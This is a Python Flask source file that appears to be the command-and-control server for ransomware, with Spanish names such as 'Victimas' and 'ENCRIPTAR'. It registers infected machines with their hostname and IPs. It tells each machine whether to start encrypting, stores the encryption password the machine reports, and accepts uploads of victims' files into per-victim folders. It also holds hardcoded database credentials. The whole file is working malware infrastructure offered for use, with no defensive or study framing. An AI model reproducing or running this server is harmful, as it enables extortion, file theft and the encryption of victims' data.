from flask import Flask
from flask import request
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import CHAR, Column, DateTime, Enum, Index, String, TIMESTAMP, Text, text
from sqlalchemy.sql import func


import os
from sqlalchemy.orm import Session

from sqlalchemy import Column, Text, text
from sqlalchemy.dialects.mysql import INTEGER, TINYINT
from sqlalchemy.ext.declarative import declarative_base

import json

# login to database
app = Flask(__name__)
#app.config["SQLALCHEMY_DATABASE_URI"] = "mysql+mysqlconnector://hackcs:hackcs097@127.0.0.1/victimas"
app.config["SQLALCHEMY_DATABASE_URI"] = "mysql+mysqlconnector://hackcs:hackcs097@10.1.11.9/hackcs"

db = SQLAlchemy(app)


# model
class Victima(db.Model):
    __tablename__ = 'Victimas'

    ID = Column(INTEGER(10), primary_key=True)
    UUID = Column(Text, nullable=False)
    HOSTNAME = Column(Text, nullable=False)
    ENCRIPTAR = Column(TINYINT(1), nullable=False, server_default=text("0"))
    ENCRIPTADO = Column(TINYINT(1), nullable=False, server_default=text("0"))


    IPPUBLICA = Column(Text, nullable=False)
    IPPRIVADA = Column(Text, nullable=False)

    ULTIMACONEXION = Column(TIMESTAMP)
    PRIMERACONEXION = Column(TIMESTAMP, nullable=False, server_default=text("'0000-00-00 00:00:00'"))
    PASSWORD = Column(Text)




@app.route("/")
def index():
    return "What are you doin here???"


@app.route("/device/<string:uuid>", methods=[ "POST"])
def device_handling_post(uuid: str):

    # add to database if it does no exist
    #print(request.json)

    dataB = Victima.query.filter_by(UUID=uuid).first()
    if dataB is None: # creaomos query
        dataB = Victima(UUID=uuid, HOSTNAME=request.json["HOSTNAME"],IPPUBLICA=request.json["PUBLIC_IP"],IPPRIVADA=request.json["PRIVATE_IP"],PRIMERACONEXION=func.now(), ULTIMACONEXION=func.now())
        db.session.add(dataB)
        db.session.commit()

    else: # modificamos query
        if "HOSTNAME" in request.json.keys():
            dataB.HOSTNAME = request.json["HOSTNAME"]
        if "ENCRYPTED" in request.json.keys():
            dataB.ENCRIPTADO = request.json["ENCRYPTED"]
        if "PUBLIC_IP" in request.json.keys():
            dataB.IPPUBICA = request.json["PUBLIC_IP"]

        if "PRIVATE_IP" in request.json.keys():
            dataB.IPPRIVADA = request.json["PRIVATE_IP"]

        if "PASSWD" in request.json.keys():
            dataB.PASSWORD = request.json["PASSWD"]

        dataB.ULTIMACONEXION = func.now()
        db.session.commit()

    return "{}"


@app.route("/device/<string:uuid>", methods=[ "GET"])
def device_handling_get(uuid: str):
    # send encriptar execute or wait
    ret = {"ENCRIPTAR": 0
           }
    data = Victima.query.filter_by(UUID=uuid).first()

    if data is None: # si no esta en la database
        return json.dumps(ret)

    else:
        ret["ENCRIPTAR"] = data.ENCRIPTAR
        print(json.dumps(ret))

    return json.dumps(ret)


@app.route("/device/<string:uuid>/upload", methods=["POST"])
def store_files(uuid : str):
    print(uuid)
    if not os.path.exists('files/'+uuid):
        os.makedirs('files/'+uuid)

    for f in request.files:
        path = "files/"+uuid + f
        os.makedirs(os.path.dirname(path), exist_ok=True)
        print(request.files[f].save("files/"+uuid + f))

    return "NOOOO"


app.run()